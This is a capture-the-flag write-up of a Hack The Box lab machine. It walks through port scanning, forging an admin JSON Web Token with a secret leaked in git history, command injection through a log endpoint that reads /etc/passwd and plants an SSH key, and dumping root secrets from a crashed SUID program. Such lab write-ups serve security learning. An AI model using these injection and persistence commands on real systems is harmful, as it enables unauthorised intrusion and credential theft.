![[banner.png]]

### System Scan

Let’s first fire up `nmap` and do a scan of the system scan.

```bash
[user@parrot]~$ sudo nmap -sV -sC -A -T4 10.10.11.120 -v

Starting Nmap 7.92 ( <https://nmap.org> ) at 2022-03-01 11:33 GMT
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 11:33
Completed NSE at 11:33, 0.00s elapsed
Initiating NSE at 11:33
Completed NSE at 11:33, 0.00s elapsed
Initiating NSE at 11:33
Completed NSE at 11:33, 0.00s elapsed
Initiating Ping Scan at 11:33
Scanning 10.10.11.120 [4 ports]
Completed Ping Scan at 11:33, 0.46s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 11:33
Completed Parallel DNS resolution of 1 host. at 11:33, 0.02s elapsed
Initiating SYN Stealth Scan at 11:33
Scanning 10.10.11.120 [1000 ports]
Discovered open port 22/tcp on 10.10.11.120
Discovered open port 80/tcp on 10.10.11.120
Discovered open port 3000/tcp on 10.10.11.120
Completed SYN Stealth Scan at 11:34, 56.52s elapsed (1000 total ports)
Initiating Service scan at 11:34
Scanning 3 services on 10.10.11.120
Completed Service scan at 11:34, 12.29s elapsed (3 services on 1 host)
Initiating OS detection (try #1) against 10.10.11.120
Retrying OS detection (try #2) against 10.10.11.120
Initiating Traceroute at 11:35
Completed Traceroute at 11:35, 0.43s elapsed
Initiating Parallel DNS resolution of 2 hosts. at 11:35
Completed Parallel DNS resolution of 2 hosts. at 11:35, 0.37s elapsed
NSE: Script scanning 10.10.11.120.
Initiating NSE at 11:35
Completed NSE at 11:35, 16.30s elapsed
Initiating NSE at 11:35
Completed NSE at 11:35, 2.70s elapsed
Initiating NSE at 11:35
Completed NSE at 11:35, 0.00s elapsed
Nmap scan report for 10.10.11.120
Host is up (0.42s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 97:af:61:44:10:89:b9:53:f0:80:3f:d7:19:b1:e2:9c (RSA)
|   256 95:ed:65:8d:cd:08:2b:55:dd:17:51:31:1e:3e:18:12 (ECDSA)
|_  256 33:7b:c1:71:d3:33:0f:92:4e:83:5a:1f:52:02:93:5e (ED25519)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
|_http-title: DUMB Docs
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
|_http-server-header: nginx/1.18.0 (Ubuntu)
3000/tcp open  http    Node.js (Express middleware)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: DUMB Docs
Aggressive OS guesses: Linux 4.15 - 5.6 (95%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.3 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 - 5.4 (93%)
No exact OS matches for host (test conditions non-ideal).
Uptime guess: 9.028 days (since Sun Feb 20 10:55:32 2022)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=256 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 110/tcp)
HOP RTT       ADDRESS
1   423.65 ms 10.10.14.1
2   423.06 ms 10.10.11.120

NSE: Script Post-scanning.
Initiating NSE at 11:35
Completed NSE at 11:35, 0.00s elapsed
Initiating NSE at 11:35
Completed NSE at 11:35, 0.00s elapsed
Initiating NSE at 11:35
Completed NSE at 11:35, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at <https://nmap.org/submit/> .
Nmap done: 1 IP address (1 host up) scanned in 97.15 seconds
           Raw packets sent: 1199 (55.338KB) | Rcvd: 1035 (42.812KB)
```

Looks like we have a web server running, and a Node JS application running. I’m assuming that this has been misconfigured since **80**  and **3000**  have the same title. Usually, you’ll block port **3000**  and run a reverse proxy through Nginx. There’s also a chance that these are two separate instances running. Let’s start enumerating further to see what we can find.

### Enumeration: Nginx

I like to initiate a scan with `gobuster` while I manually peruse the website. Run `gobuster` with a medium-size list from `dirb` and save the results to a file for later reference, With that running in the background, enumerate the site.

```bash
[user@parrot]~$ gobuster -w ~/Desktop/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt dir -u 10.10.11.120 | tee enum-scan.txt
```

The **Live Demo** button in the top right corner shows there’s a working API running on the server. There’s some comprehensive documentation around the API that will be important to test later on. All the way down at the bottom, there is a link to download the source code and it is an actual working link. Download the source code and throw it in a folder `av-sc` for later debugging.

After the search there are three main endpoints found:

-   Live Demo: `/api`
-   Introduction/Installation: `/docs`
-   Download Source Code: `/download`

The results from `gobuster` are in, and their results are the same. That’s not to say that there aren’t any other hidden routes, but for now, it appears that the entirety of the website has been enumerated.

```bash
[user@parrot]~$ gobuster --wordlist ~/Desktop/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt dir -u 10.10.11.120 --threads 40 | tee enum-scan.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     <http://10.10.11.120>
[+] Method:                  GET
[+] Threads:                 40
[+] Wordlist:                /home/user/Desktop/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/03/01 12:07:22 Starting gobuster in directory enumeration mode
===============================================================
/download             (Status: 301) [Size: 183] [--> /download/]
/docs                 (Status: 200) [Size: 20720]               
/assets               (Status: 301) [Size: 179] [--> /assets/]  
/api                  (Status: 200) [Size: 93]                  
/Docs                 (Status: 200) [Size: 20720]               
/API                  (Status: 200) [Size: 93]                  
/DOCS                 (Status: 200) [Size: 20720]               
                                                                
===============================================================
2022/03/01 12:19:30 Finished
===============================================================
```

Before moving on, it’s best to check that there is in the face a working API at the `/api` endpoint.

Going to `[<http://10.10.11.120/api/priv>](<http://10.10.11.120/api/priv>)` in Firefox returns an **Access Denied** result. According to the documentation, this is expected.

![[first.png]]

There is a working implementation of this API operational on the website, and documentation on how to operate it! Plus the source code to hunt for vulnerabilities. A gold mine! Time to start hunting.

### Enumeration: Source Code

I’m more of a backend developer, therefore, JS and I really don’t get along, but the source code was pretty straightforward. It’s recommended to go through the entirety of the source code, but the first file to notice is `routes/private.js`

```bash
[user@parrot]~$ ls -l

total 80
-rw-rw-r-- 1 user user   885 Sep  3 06:56 index.js
drwxrwxr-x 1 user user    14 Aug 13  2021 model
drwxrwxr-x 1 user user  4158 Aug 13  2021 node_modules
-rw-rw-r-- 1 user user   491 Aug 13  2021 package.json
-rw-rw-r-- 1 user user 69452 Aug 13  2021 package-lock.json
drwxrwxr-x 1 user user    20 Sep  3 06:54 public
drwxrwxr-x 1 user user    80 Sep  3 07:32 routes
drwxrwxr-x 1 user user    22 Aug 13  2021 src
-rw-rw-r-- 1 user user   651 Aug 13  2021 validations.js
```

There is an endpoint not within the documentation: `/api/logs`. Further inspections show that there’s an opportunity for an RCE, assuming we are `theadmin`. The `file` GET parameter is not sanitized and a command is executed on the server.

The other file to notice is `routes/verifytoken.js`. There is a plethora of websites that discuss ways to hack JSON Web Tokens (JWT). The key takeaway from `routes/verifytoken.js` is that the JWT algorithm is not specified. Because of that, there’s a chance the JWT can be modified to use the `none` algorithm to bypass validation.

Here’s the attack plan:

-   Create a new user on the system as `theadmin`. If this works the following is moot, but its best to assume the worst.
-   Create a new low-level user on the system.
-   Modify the JWT to be `theadmin`
-   Access restriction endpoints.

Looking through the docs, it explains everything one needs to do to create a user, and interact with the site.

### Abusing the API

First things first, try creating a new user as `theadmin`

```bash
[user@parrot]~$ curl -i -X POST \\
[user@parrot]~$  -H 'Content-Type: application/json' \\
[user@parrot]~$  -d '{"name":"theadmin", "email":"nikk@dasith.works", "password":"secureafpass"}' \\
[user@parrot]~$  <http://10.10.11.120/api/user/register>

HTTP/1.1 400 Bad Request
Server: nginx/1.18.0 (Ubuntu)
Date: Tue, 01 Mar 2022 12:42:11 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 18
Connection: keep-alive
X-Powered-By: Express
ETag: W/"12-bovfAO8maqeTuF6NiWgD46KUq3k"

Name already Exist
```

As expected, but had to try. The documentation has an example, using the `theadmin` user, with a password. Try to log in using that combination, but it will end in sadness.

Create a new user. Note, that the `email` field must be `@dasith.works` to be a valid email. You read all the source code, right?

```bash
[user@parrot]~$ curl -i -X POST \\
[user@parrot]~$   -H 'Content-Type: application/json' \\
[user@parrot]~$   -d '{"name":"nikkuser", "email":"nikk@dasith.works", "password":"secureafpass"}' \\
[user@parrot]~$   <http://10.10.11.120/api/user/register>

HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Tue, 01 Mar 2022 12:45:06 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 19
Connection: keep-alive
X-Powered-By: Express
ETag: W/"13-nMwSa8wOE7Tes2O0RM+grrknEZs"

{"user":"nikkuser"}
```

With the new user-created, time to log in and bypass JWT validation.

### JSON Web Tokens

First, need to log into the system.

```bash
[user@parrot]~$ curl -i -X POST \\
[user@parrot]~$   -H 'Content-Type: application/json' \\
[user@parrot]~$   -d '{"email":"nikk@dasith.works", "password":"secureafpass"}' \\
[user@parrot]~$   <http://10.10.11.120/api/user/login>

HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Tue, 01 Mar 2022 12:47:43 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 211
Connection: keep-alive
X-Powered-By: Express
auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjFlMTU1MmM5ZTZlYjA0NjFjOWE1ZGIiLCJuYW1lIjoibmlra3VzZXIiLCJlbWFpbCI6Im5pa2tAZGFzaXRoLndvcmtzIiwiaWF0IjoxNjQ2MTM4ODYzfQ.eNRg6ZFwDLK81Ii0Sv5bBejyDDPVBHxOhyIrWdj9NgI
ETag: W/"d3-BsH/RpnMpPlYDQb47Vns2+LcxJM"

eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjFlMTU1MmM5ZTZlYjA0NjFjOWE1ZGIiLCJuYW1lIjoibmlra3VzZXIiLCJlbWFpbCI6Im5pa2tAZGFzaXRoLndvcmtzIiwiaWF0IjoxNjQ2MTM4ODYzfQ.eNRg6ZFwDLK81Ii0Sv5bBejyDDPVBHxOhyIrWdj9NgI
```

The three main ways to bypass JWT validation:

-   Using the `none` alg
-   Hijacking another user
-   Bruteforcing the key.

Let’s start by changing the `alg`, looking at the code, there isn’t an alg specified. `[JWT.io](<http://JWT.io>)` is a great place to inspect and modify JWTs

![[second.png]]

Try changing the `alg` param to `none` but to no avail. Other attempts were `NONE`, `nOnE`, `NOne`, etc. Also to no avail.

Another option would be to hijack another user’s JWT, but there's no indication that other users are using the system.

There is a wonderful little tool [jwt-cracker](https://lmammino.github.io/jwt-cracker/) that can brute force HS256 keys. However, this won't work either, the key must be very complex.

## Re-examining the Source Code

In the initial look at the files, hidden files were overlooked. There are two hidden files that came from the ZIP: `.env` and `.git`

Looking at the `.env` file, there is a `TOKEN_SECRET` that is used to encrypt the JWTs. According to `.env`, it's _secret_. Going back to [jwt.io](https://jwt.io/) there’s a box to enter the secret into the HMACSHA256, adding in _secret_, there is now a valid token to use.

![[third.png]]

Using that to access `/api/priv` still is rejected, saying the token is invalid! This means the `TOKEN_SECRET` is wrong!

![[fourth.png]]

There was also a `.git` folder. We can look back and see the history of the source code changes. Running a `git log` on the source code, there's an interesting commit message.

> removed .env for security reasons

Interestingly enough, the `.env` file is still there. To go back in time and see what happened:

```bash
[user@parrot]~$ git diff HEAD~2
```

![[fifth.png]]

FINALLY! Go back to [JWT.io](http://JWT.io), change the `name`  field to `theadmin`  and paste the key within the HMAC secret. Test the newly created JWT against `/api/priv`  endpoint to ensure the bypass worked.

### Obtaining a Foothold

With an admin account in place, it’s time to leverage the `/api/logs` endpoint to gain access to the server. This is essentially a working web shell.

First, check who the user running the application is with `id`, and grab the list of users from `/etc/passwd`. The web shell endpoint allows for chaining bash commands using the`;` character. The caveat is that the `file` GET parameter needs to be URL encoded for it to be accepted in `curl`.

The full URL will be: [http://10.10.11.120/api/logs?file=index.js;id;cat+/etc/passwd](http://10.10.11.120/api/logs?file=index.js;id;cat+/etc/passwd) notice the spaces are replaced with `+`. The output is quite hard to decipher, to clean this up, pipe the output from `curl` into `sed` and replaces `\\n` with actual newline characters.

```bash
[user@parrot]~$ curl -i '\\n' -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjFlMTU1MmM5ZTZlYjA0NjFjOWE1ZGIiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6Im5pa2tAZGFzaXRoLndvcmtzIiwiaWF0IjoxNjQ2MTM4ODYzfQ.7fwnTwm0Ze-63VU-K-fVIochFfesOjlvi6S-DTHJJek' '<http://10.10.11.120/api/logs?file=index.js;id;cat+/etc/passwd>' | sed 's/\\\\n/\\n/g'
```

![[sixth.png]]

Great news, the user running the application is a real user with a login shell. From here, it’s possible to create a reverse shell and start enumerating, but reverse shells are rough to work with. Reviewing the open ports from `nmap` again, SSH is running. I always say if you can SSH in, do it! To do this, add an SSH public key to `authorized_machines`  file of the user's home directory.

In a real engagement, don’t use your machine's main SSH key. Always generate a new one.

```bash
[user@parrot]~$ ssh-keygen -t rsa -b 4096 -C 'nikkuser@htb' -f 10.10.11.120 -P ''
```

![[seventh.png]]

This command generates a new SSH public and private key in your current directory named `10.10.11.120`.

To ensure the public key is added, make sure that the `.ssh` folder exists on the system, and there is a file called `.ssh/authorized_keys`. Rather than manually checking, we can add commands that won’t overwrite any existing files or folders, but will create them if they don’t exist.

-   `mkdir -p /home/dasith/.ssh`
-   `echo $PUBLIC_KEY >> /home/dasith/.ssh/authorized_keys`

First, store the contents of your public key into a bash variable:

```bash
[user@parrot]~$ curl -i -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjFlMTU1MmM5ZTZlYjA0NjFjOWE1ZGIiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6Im5pa2tAZGFzaXRoLndvcmtzIiwiaWF0IjoxNjQ2MTM4ODYzfQ.7fwnTwm0Ze-63VU-K-fVIochFfesOjlvi6S-DTHJJek' -G --data-urlencode "file=index.js; mkdir -p /home/dasith/.ssh; echo $PUBLIC_KEY >> /home/dasith/.ssh/authorized_keys" '<http://10.10.11.120/api/logs>'
```

![[eigth.png]]

Receiving a 200 indicates that our test probably worked! SSH into the box.

```bash
[user@parrot]~$ ssh -i 10.10.11.120 dasith@10.10.11.120
```

![[nineth.png]]

Get that user hash

```bash
[user@parrot]~$ cat user.txt
```

Probably a bit too much partying for `user`, but it is still hella exciting! Keep that energy going and root this bad boy.

### Enumeration: The Box

The typical enumeration didn’t lead to anything blatantly obvious. Trying `linenum.sh` was a bust. I usually try the `/opt` folder to see if any extra manually installed applications are live. Excellent! We have some C code, a compiled version of it with a SUID bit enabled (owned as root), and a Valgrind output file.

This was the most difficult part of the box for me, and it took quite a while. Honestly, this is really where I think it leaves the “easy” realm and becomes a more “medium” box.

Before diving into the code, check out the program in action. Since we have the SUID bit enabled, we can run this application as its owner, in this case, `root`!

![[tenth.png]]

Enter `/root/root.txt` since that’s a file known to exist on this system. It has a similar output to the `wc` command, and there’s even an option to save the output to a file. Doing so only saves the count data, nothing about the actual file contents. Disappointing. Try again using the `/root` directory. This is great, there's access to `root`, but it needs to be leveraged into privilege escalation.

Time to inspect the code.

## Enumeration: `count` Code

Been a long time since I’ve worked in C. Going through, there’s a spot where the code go from the privileged user, back down to the current user’s UID. Unfortunately, there is no way to stop it from happening. The Valgrind file is a big hint though.

Looking at the code again, we see that the file requested is read into memory. That means we can try to use `gdb` or `strace` to run the application and dump the memory as we use the file

![[eleventh.png]]

Sadly, the SUID bit doesn’t hold when ran through those programs. After some research, apparently that’s standard Linux security. However, there is another method we can take

# Privilege Escalation

Leveraging Core Dump. This is usually not enabled by default, but having valgrind file in the directory hints that way.

The plan is to execute the program, have it read the file into memory, and then purposefully crash the program. Causing a core dump will dump the contents of the applications memory to a file.

![[twelth.png]]

![[thirteenth.png]]

Run the application and access `/root/root.txt`. When the application asks to save the contents to a file, press `CTRL` + `z` to push the application in the background. Next, run `ps` to get the PID of the application.

shit dun broke son!

Never thought it’d be so great to break a program. The core dump files are located at `/var/crashes`, and they can be unpacked using `apport-unpack` to view the data.

```bash
[user@parrot]~$ apport-unpack /var/crash/_opt_count.1000.crash /tmp/crash-report
```

![[fourteenth.png]]

You can use `less` to view the core dump, but its a binary file and the data is hard to sift through. `xxd` would be a good option, but since we’re looking for the flag, using the `strings` command is the best call.

```bash
[user@parrot]~$ strings /tmp/crash-report/CoreDump
```

Look through the output and you’ll see something that clearly resembles a hash. I’m omitting the hash, you’ll have to hack the box yourself ;)

## Epilogue

Now, this is all fine and dandy, but have you really rooted the box? You got the flag, but don’t have a shell on the box. Since we can now leverage `./count` to read any file on the system, we can grab the `root` user’s SSH private key and use that to log into the system. Run the same process as before, but point it to `/root/.ssh/id_rsa`. Crash the program, and use `strings`. You’ll see the private key within the dump.

Grab the key from the terminal, copy-paste onto your local box, and GOGOGO

![[last.png]]

### Conclusion

It was nice to utilize my software engineering background to solve this box. Still, this was not on the easy side in my opinion but definitely had fun with it. Hope you enjoyed it. Happy hacking!

### Reference

-   [Core Dumps on Linux](https://linux-audit.com/understand-and-configure-core-dumps-work-on-linux/)
-   [JWT.io](https://jwt.io/)